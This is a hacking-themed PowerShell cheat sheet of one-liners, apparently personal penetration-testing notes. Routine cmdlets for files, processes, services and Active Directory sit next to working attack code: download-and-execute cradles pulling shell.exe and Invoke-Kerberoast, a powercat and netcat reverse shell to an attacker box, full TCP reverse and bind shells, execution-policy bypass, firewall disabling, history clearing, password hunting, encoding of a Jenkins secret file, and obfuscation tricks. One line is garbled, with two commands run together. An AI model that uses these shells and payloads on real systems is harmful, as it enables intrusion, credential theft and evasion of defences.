# Useful PowerShell

This is a condensed and *Hacking themed* resource for PowerShell. PowerShell is a massive and my humble opinion a *weird* object-oriented programming language.  Windows and PowerShell are not case-sensitive, but a *standard* readability is to use upper-case first letter - I suggest not unless you need to present your work(use a script to change it to *standard*). Every command has a `cmdlet` and combinations of `verb-noun` to construct command that would be too numerous to list. So to define the theme of this document is oneliners categorised by use(*just in case at some point they maybe some exceptions like two oneliners that need to be separate executions* **THESE WILL HAVE A `# TASKNAME Command # THEN Command`**. I am in the process of making this better for my own use:
1. Adding aliases that I might want to use instead of full command
2. Making the comments defining explaining a better layout

## Windows PowerShell Executables File System Locations

The default paths to the executables for PowerShell and PowerShell ISE on relevant **64-bit** Windows operating systems:  
  
App | Location
--- | ---
32-bit (x86) PowerShell executable | `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
64-bit (x64) Powershell executable | `%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe`
32-bit (x86) Powershell ISE executable | `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe`
64-bit (x64) Powershell ISE executable | `%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe`

The default paths to the executables for PowerShell and PowerShell ISE on relevant **32-bit** Windows operating systems:  

App | Location
--- | ---
32-bit (x86) PowerShell executable | `%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe`
32-bit (x86) Powershell ISE executable  | `%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe`

[Powershelladmin](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations.php)

For all the [[PowerShell-Verbs]].

## Community Repositories

I-Am-Jackoby's - https://github.com/I-Am-Jakoby/PowerShell-for-Hackers


## Execution policy bypass And Versioning 
```powershell
powershell -ep bypass
powershell.exe -exec bypass C:\Wowsershell.ps1
$PSVersionTable
```

## File transfers
```powershell
(New-Object system.Net.WebClient).Downloadfile('http://ATTACKBOX_IP/shell.exe')

iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')

Invoke-WebRequest -Uri http://$ATTACKBOX_IP -OutFile file.exe

# http.server 8888 in powercat directory
# nc -lvnp 1337
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"

# One line NC web server
# REQUIRES NETCAT on target!
while(1) { cat index.html | nc -w1 -l -p 8080 }

# HARDCORE GUI way:
# Add ip to trusted sites and download
```
[Add to trusted sites with powershell](https://stackoverflow.com/questions/51720030/ie-browser-powershell-script-to-add-site-to-trusted-sites-list-disable-protec) there are always [[Windows-File-Transfers]] and [[Windows-Living-Off-The-Land]]

## General
```powershell
Get-Command              # list of powershell commands, BEWARE OF THE LISTS
Get-Verb				 # list all verbs
Get-Help                 # help for specific cmdlet
Get-Help $Command-Namepowershell -c [convert]::ToBase64String((cat ..\..\secrets\hudson.util.Secret -Encoding byte)) 
Get-Command Verb-* 
Get-Command *-Noun # Commands and Cmdlets are both executables in ps, Command= compiled, can be solo-executed cmdlets
Get-Command | Get-Member -MemberType Method # view members for a the get command
Get-Command -Type Cmdlets | Measure-Object -Sum -ErrorAction SilentlyContinue
Get-Alias		
Set-Alias				 	# Make commands
Set-Alias -Name helpmeplease -Value Get-help
```

## Providers and Modules
```powershell
# A provider is .NET program to access data stores
# Typically included in modules and are accessible after the module has been loaded into the current session
Get-PSProvider

# Modules are packages that contain additional cmdlets, functions, providers, etc that an be imported into the current session
Get-Module 
Get-Module -ListAvailable
Get-Command -Module Defender	# Return all functions of a module
```

## System Information
```powershell
Get-HotFix -ID
$PSVersionTable.PSVersion
Get-History							# Get command history
Clear-History						# Use with care and permission
Get-ChildItem ENV:      # Display all environment variables
```

## Software Information
```powershell
Get-ExecutionPolicy			
Set-ExecutionPolicy -RemoteSigned	# -Flags -Name -ListAvailable
```

## Network information
```powershell
# wmi-object in win10 are good tool to find safest lateral movement  
Get-WmiObject Query Select from Win32_NetworkAdapterConfiguration | Where-Object Index = $device_number
(Get-NetIPAddress | Where-Object InterfaceAlias -eq "Local Area Connection").IPv4Address | select -first 1).gettype().fullname
# Local smbshare information
Get-SmbShare
```

## Network Sockets
Create a socket and connect to it
```powershell
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork, 
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", $port)
# Powershell AddressFamilies, the above is IPv4
# InterNetworkV6, NetBios, Unix
# See: https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.addressfamily?view=net-6.0
```

## Objects 
```powershell
Select-Object -Property Mode, Name
-first 	# gets the first x object
-last 	# gets the last x object
-unique # shows the unique objects
-skip   # skips x objects
Where-Object # Filter through objects
```

## Strings
```powershell
Select-String "..." -List  # CAREFUL WHERE YOU RUN it relative to working directory location!
Select-String $String -context 10,10			# Findstr but get the ten lines previous and after match VERY HANDY with sysinternals
Get-ChildItem C:\ -Recurse | Select-String -Pattern "password"
```

## Maths, Counting and Measuring
```powershell
Measure-Object -Sum -ErrorAction SilentlyContinue
```

## File and Directory interactions
```powershell
## Reading and Writing 
Get-Content							  # Reading file
Get-Content -Path .\filename.FILETYPE # -Raw for raw file output

Set-Content 		# Writing to files
Expand-Archive -Path .\*.zip -DestinationPath C:\Destination # Expand a zip file

Get-Location        # print working directory
Set-Location 		# choose a directory for context to operate

## File Hashing and checksums 
# FILTERHASHTABLE 101:
# Levels:
# NAME            VALUE
# verbose         5
# informational   4
# warning         3
# error           2
# critical        1
# logalways       0 
# FOR EXAMPLE:
Get-FileHash -Path ... -Algorithm
CertUtil -hashfile [FILE] MD5|SHA256|SHA512
## Finding ##
# -Force flag to show hidden or system items 

Get-ChildItem # Aliased ls, dir, gci
Get-ChildItem -Hidden
Get-ChildItem -Path C:\ -Include *.doc,*.[FILETYPE] -File -Recurse -ErrorAction SilentlyContinue #Find all finds of a particular filetype:
Get-ChildItem –Path C:\ -Include *HSG* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue # Find all find that include *"..."* BUT also exclude wildcard. Filetype
Get-Childitem -Path C:\ -Recurse # Display directory listing under a parent file, flag: recursive for recursive directory scrapping
gci -Filter "" –Directory |  % { $_.fullname } # Find directoies

Get-Acl # Get owner of directory again careful of relative running from another directory

Where-Object # TODO
Import-CSV file.csv     # Read a CSV file

[xinyMinutes](https://learnxinyminutes.com/docs/powershell/)
[hacktricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)```

## Processes tasks and scheduled tasks
```powershell
Get-Process
Get-Process -ID $PID -IncludeUserName # Owner of proccess
Get-Process -ID $PID | Format-Table * # All data on a PID
# Get parent process
Get-CimInstance -className win32_process | where-object {$_.ProcessId -eq processId_goes_here } | select ParentProcessId, Name 

# Scheduled Tasks
schtasks
schtasks /query /fo /LIST /v
Get-ScheduledTask [-Taskname] [-TaskPath]

##  Sofware ##
# Change executionpolicy
Get-ExecutionPolicy
Set-ExecutionPolicy bypass -scope process

Start-Process -NoNewWindow "c:\path\to\shell\nc64.exe" "-e cmd.exe $attacker-ip $port"
```

## Services
```powershell
# Display all the Automatic StartType Services
Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"} | Format-Table

# Startup type
Get-Service | select -Property Name, StartType
Get-WmiObject -Query "Select StartMode From Win32_Service Where Name='winmgmt'"
```

## Registery
```powershell
# Get Providers
Get-PSProvider
# Get Provider Drives

# Making a new registery key
cd HKLM:
New-Item myKey
New-ItemProperty -Path .\myKey\ -Name Test -Type DWORD -Value 1
```

[Devblogs](https://devblogs.microsoft.com/powershell-community/how-to-update-or-add-a-registry-key-value-with-powershell/) provides a great script to to test the registry key path first, creating it if needed, then setting the value entry:
```powershell
# Set variables to indicate value and key to set
$RegistryPath = 'HKCU:\Software\CommunityBlog\Scripts'
$Name         = 'Version'
$Value        = '42'
# Create the key if it does not exist
If (-NOT (Test-Path $RegistryPath)) {
  New-Item -Path $RegistryPath -Force | Out-Null
}  
# Now set the value
New-ItemProperty -Path $RegistryPath -Name $Name -Value $Value -PropertyType DWORD -Force 
```


## Networking
```powershell
# Test connection
Test-NetConnection -ComputerName 127.0.0.1 -Port 80 -InformationLevel 'Detailed'
# Check the test connection with:
(New-Object System.Net.Sockets.TcpClient("127.0.0.1", "80")).Connected

netstat -noa |findstr "LISTENING" |findstr "PORTNUMBER"                 # Find process port

# nslookup.exe for dc enumeration within a network
nslookup.exe
server ip
ls -d domainname
```

## Host Security Detection
```powershell
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct     # Windows servers may not have SecurityCenter2
Get-Service WinDefend
Get-MpComputerStatus                                                            # Get the status of security solution elements
Get-MpThreat                                                                    # History of detected threats
Get-NetFirewallProfile | Format-Table Name, Enabled                             # Firewall details
Get-NetFirewallRule | select DisplayName, Enabled, Description                  # Show all enable firewall rules
Get-NetFirewallRule | findstr "rulename"                                        # Find specific rule with findstr
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False          # disable a firewall
```

## Active Directory
```powershell
# Certain Privileges!
Get-ADUser -Filter *
Get-ADUser -Filter * -SearchBase "CN=Admin,OU=THM,DC=redteam,DC=com" # CN=Common Name, DC=Domain Component, OU=OrganizationalUnitName, et
Get-ADForest | Select-Object Domains
Get-ADDomain | Select-Object NetBIOSName, DNSRoot, InfrastructureMaster
Get-ADTrust -Filter * | Select-Object Direction,Source,Target
Get-NetDomain
Get-NetDomainController
Get-NetForest
Get-NetDomainTrust
```

## Certificates
```powershell
Get-ChildItem -Path cert:\LocalMachine
```

## Encoding
```powershell
powershell -c [convert]::ToBase64String((cat $file -Encoding byte)) 
```

[Medium PowerShell Obfuscation - SecureTacticsTS](https://medium.com/@SecureTacticsTS/simple-but-effective-powershell-obfuscation-techniques-b38900d8f7dd)
```powershell
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes())
$Encoding2 =[System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String('MQAwAC4AMQAxAC4AMwAuADEAOQAzADoAOAA0ADQAMwA='))
```

[SANS](https://www.sans.org/blog/month-of-powershell-profile-hack-base64-encoding-decoding/)
```powershell
Function ConvertFrom-Base64($base64) {
    return [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($base64))
}
Function ConvertTo-Base64($plain) {
    return [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($plain))
}
```
## Formatting
Powershell formating leads to obsucation with [-f Format operator](https://ss64.com/ps/syntax-f-operator.html)
```powershell
${string} = ("{9}{8}{7}{6}{5}{4}{3}{2}{1}{0}"-f'Power','shell',' Formatting',' is',' obfuscation',' through',' ordering',' of',' parametres and splitting','strings')
echo $string 
```

## PowerShell Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1337);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```
Enclose with:
```powershell
 powershell -c "<code>"
```
For the one liner

## PowerShell Bind Shell
Remember to change local addresss accordingly, some localhosts won't be `0.0.0.0`
```powershell
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()
```
Enclose with:
```powershell
 powershell -c "<code>"
```
For the one liner.

## Credential Making

- [a73xsh](https://gist.github.com/a73xsh/59463149c50d75c3a25889cf20823f8e)
```powershell
$user = "addyouruser"
$pass = convertto-securestring -asplaintext -force -string ""
$cred = new-object -typename system.management.automation.pscredential($user,$pass)
$session = newpssession -computername dc01 -credential $cred
enter-pssession -session $sessions
# Sometimes you need to use invoke command instead of $session creation due to shell limitations
invoke-command -computername $computername -ScriptBlock { hostname }  -Credential $cred
# PSRemoting may require a specific configuration:
-ConfigurationName $configName
```

## Type accelerators

[docs.microsoft.com about_type_accelerators in powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_type_accelerators?view=powershell-7.1): *"Type accelerators are aliases for .NET framework classes allowing access to specific .NET framework classes without having to type the full class name explicitly. For example:
`AliasAttribute` class from `[System.Management.Automation.AliasAttribute]` to `[Alias]`."*

Create new type accelerators [idera adding-new-type-accelerators-in-powershell](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell) 


## References

[devblogs.microsoft](https://devblogs.microsoft.com/scripting/)
[docs.microsoft.com about_type_accelerators in powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_type_accelerators?view=powershell-7.1)
[idera adding-new-type-accelerators-in-powershell](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell) 
[THM Holo](https://tryhackme.com/room/hololive)
[xinyMinutes](https://learnxinyminutes.com/docs/powershell/)
[hacktricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
[Medium PowerShell Obfuscation - SecureTacticsTS](https://medium.com/@SecureTacticsTS/simple-but-effective-powershell-obfuscation-techniques-b38900d8f7dd)
[SANS](https://www.sans.org/blog/month-of-powershell-profile-hack-base64-encoding-decoding/)
[learn.microsoft.com - Working with files and folders](https://learn.microsoft.com/en-us/powershell/scripting/samples/working-with-files-and-folders?view=powershell-7.4)